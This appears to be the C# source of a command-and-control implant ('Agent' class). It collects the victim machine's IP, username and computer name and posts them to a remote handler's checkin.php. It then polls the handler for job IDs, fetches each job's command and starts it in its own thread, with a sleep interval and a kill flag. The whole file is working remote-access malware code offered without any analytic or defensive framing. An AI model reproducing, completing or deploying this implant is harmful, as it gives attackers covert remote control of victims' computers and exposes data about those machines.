using System;
using System.Collections.Generic;
using System.Diagnostics;
using System.IO;
using System.Net;
using System.Net.Sockets;
using System.Text;
using System.Threading;
using System.Web.Script.Serialization;

class Agent
{
    public string id { get; set; }
    public string internal_ip { get; set; }
    public string external_ip { get; set; }
    public string user { get; set; }
    public string computer_name { get; set; }
    public string status { get; set; }
    public string created_at { get; set; }
    public string checked_in { get; set; }
    public string registered { get; set; }
    public string api_key { get; set; }
    public string handler_url { get; set; }
    public string sleep_time { get; set; }
    public string killed { get; set; }

    /// <summary>
    /// Constructor to set default values at object creation
    /// </summary>
    public Agent()
    {
        this.id = "0";
        this.internal_ip = "0.0.0.0";
        this.external_ip = "0.0.0.0";
        this.user = "unknown";
        this.computer_name = "unknown";
        this.status = "sleep";
        this.created_at = "unknown";
        this.checked_in = "unknown";
        this.registered = "false";
        this.api_key = "unknown";
        this.handler_url = "unknown";
        this.sleep_time = "5000";
        this.killed = "false";
    }

    public bool UpdateSelf()
    {
        Debug.WriteLine("Updating Agent Self Info");
        try
        {
            this.internal_ip = GetInternalIP();
            this.user = GetCurrentUser();
            this.computer_name = GetComputerName();
            return true;
        }
        catch (Exception)
        {
            this.Sleep();
            return false;
        }
        
    }

    public string GetComputerName()
    {
        return Environment.MachineName;
    }

    public string GetCurrentUser()
    {
        return System.Security.Principal.WindowsIdentity.GetCurrent().Name;
    }

    private string GetInternalIP()
    {
        string internal_ip = "0.0.0.0";
        if (System.Net.NetworkInformation.NetworkInterface.GetIsNetworkAvailable())
        {
            var host = Dns.GetHostEntry(Dns.GetHostName());
            foreach (var ip in host.AddressList)
            {
                if (ip.AddressFamily == AddressFamily.InterNetwork)
                {
                    internal_ip = ip.ToString();
                }
            }
        }
        return internal_ip;
    }

    public void Sleep()
    {
        Debug.WriteLine("Sleeping for " + this.sleep_time + " miliseconds...");
        int sleep_time_int = int.Parse(this.sleep_time);
        Thread.Sleep(sleep_time_int);
    }
    
    private void ResetAgent()
    {
        this.id = "0";
        this.internal_ip = "0.0.0.0";
        this.external_ip = "0.0.0.0";
        this.user = "unknown";
        this.computer_name = "unknown";
        this.status = "sleep";
        this.created_at = "unknown";
        this.checked_in = "unknown";
        this.registered = "false";
        this.sleep_time = "5000";
        this.killed = "false";
    }

    public bool CheckIn()
    {
        Debug.WriteLine("Running Check In");
        try
        {
            string remote_function = "checkin.php";
            string post_string = "id=" + this.id + "&internal_ip=" + this.internal_ip + "&external_ip=" + this.external_ip +
                "&user=" + this.user + "&computer_name=" + this.computer_name + "&status=" + this.status + "&created_at=" + this.created_at + "&checked_in=" + this.checked_in +
                "&registered=" + this.registered + "&api_key=" + this.api_key + "&handler_url=" + this.handler_url +
                "&sleep_time=" + this.sleep_time + "&killed=" + this.killed;

            string response_json = HttpPost(post_string, remote_function);

            Dictionary<string, string> checkin_data = ResponseJsonToDict(response_json);
            if (checkin_data["id"] == null)
            {
                Debug.WriteLine("Received null data so resetting agent for new ID / Check In");
                ResetAgent();
                this.Sleep();
                return false;
            }
            else
            {
                SyncAgentResponse(checkin_data);
                return true;
            }
        }
        catch (Exception)
        {
            this.Sleep();
            return false;
        }
    }

    private void SyncAgentResponse(Dictionary<string, string> checkin_data)
    {
        this.id = checkin_data["id"];
        this.status = checkin_data["status"];
        this.created_at = checkin_data["created_at"];
        this.checked_in = checkin_data["0"];
       if (checkin_data["registered"] == "1")
        {
            this.registered = "true";
        }
        else if (checkin_data["registered"] == "0")
        {
            this.registered = "false";
        }
        this.handler_url = checkin_data["handler_url"];
        this.sleep_time = checkin_data["sleep_time"];
        if (checkin_data["killed"] == "1")
        {
            this.killed = "true";
        }
        else if (checkin_data["killed"] == "0")
        {
            this.killed = "false";
        }
    }

    public Dictionary<string, string> ResponseJsonToDict(string response_json)
    {
       var serializer = new JavaScriptSerializer(); //using System.Web.Script.Serialization;

        Dictionary<string, string> dict = serializer.Deserialize<Dictionary<string, string>>(response_json);

        return dict;
    }

    /// <summary>
    /// Function to take a post string and remote php file, pass the data and return a string
    /// </summary>
    /// <param name="post_string"></param>
    /// <param name="remote_function"></param>
    /// <returns></returns>
    private string HttpPost(string post_string, string remote_function)
    {
        string post_data =  post_string;

        string uri = this.handler_url + remote_function;

        HttpWebRequest request = (HttpWebRequest)
        WebRequest.Create(uri); request.KeepAlive = false;
        request.ProtocolVersion = HttpVersion.Version10;
        request.Method = "POST";

        byte[] postBytes = Encoding.ASCII.GetBytes(post_data);

        request.ContentType = "application/x-www-form-urlencoded";
        request.ContentLength = postBytes.Length;
        Stream requestStream = request.GetRequestStream();

        requestStream.Write(postBytes, 0, postBytes.Length);
        requestStream.Close();

        HttpWebResponse response = (HttpWebResponse)request.GetResponse();

        StreamReader sr = new StreamReader(response.GetResponseStream());
        string postresp = sr.ReadToEnd();

        return postresp;
    }

    public bool ProcessJobs()
    {
        Debug.WriteLine("Running Process Jobs");
        try
        {
            List<string> job_ids = GetJobIDs();
            if (job_ids.Count > 0)
            {
                List<Job> jobs = new List<Job>();
                foreach (string job_id in job_ids)
                {
                    string job_json = GetJobByID(job_id);
                    Dictionary<string, string> job_data = ResponseJsonToDict(job_json);

                    Job job = new Job
                    {
                        api_key = this.api_key,
                        handler_url = this.handler_url,
                        id = job_data["id"],
                        agent_id = job_data["agent_id"],
                        command = job_data["command"],
                        complete = job_data["complete"],
                    };

                    jobs.Add(job);

                    
                }
                
                foreach (Job j in jobs)
                {
                    //Console.WriteLine(j.command);
                    //j.RunCmd();
                    ThreadStart function_ref = new ThreadStart(j.Start);
                    Thread jobThread = new Thread(function_ref);
                    jobThread.Start();
                }
            }


            return true;
        }
        catch (Exception)
        {
            return false;
        }
    }

    private string GetJobByID(string job_id)
    {
        string remote_function = "getjobbyid.php";
        string post_string = "api_key=" + this.api_key + "&agent_id=" + this.id + "&job_id=" + job_id;

        string response_json = HttpPost(post_string, remote_function);

        return response_json;
    }

    private List<string> GetJobIDs()
    {
        string remote_function = "getjobids.php";
        string post_string = "api_key=" + this.api_key + "&agent_id=" + this.id;

        string response_json = HttpPost(post_string, remote_function);

        List<string> job_ids = new List<string>();

        if (response_json != "false")
        {

            response_json = response_json.Substring(1, response_json.Length - 2);
            string[] jsons = response_json.Split(',');
            
            foreach (string j in jsons)
            {
                Dictionary<string, string> jobs_data = JobsJsonToDict(j);
                job_ids.Add(jobs_data["id"]);
            }

            return job_ids;
        }

        return job_ids;
    }

    private Dictionary<string, string> JobsJsonToDict(string response_json)
    {
        
        var serializer = new JavaScriptSerializer(); //using System.Web.Script.Serialization;

        Dictionary<string, string> jobs_dict = serializer.Deserialize<Dictionary<string, string>>(response_json);

        return jobs_dict;
    }
}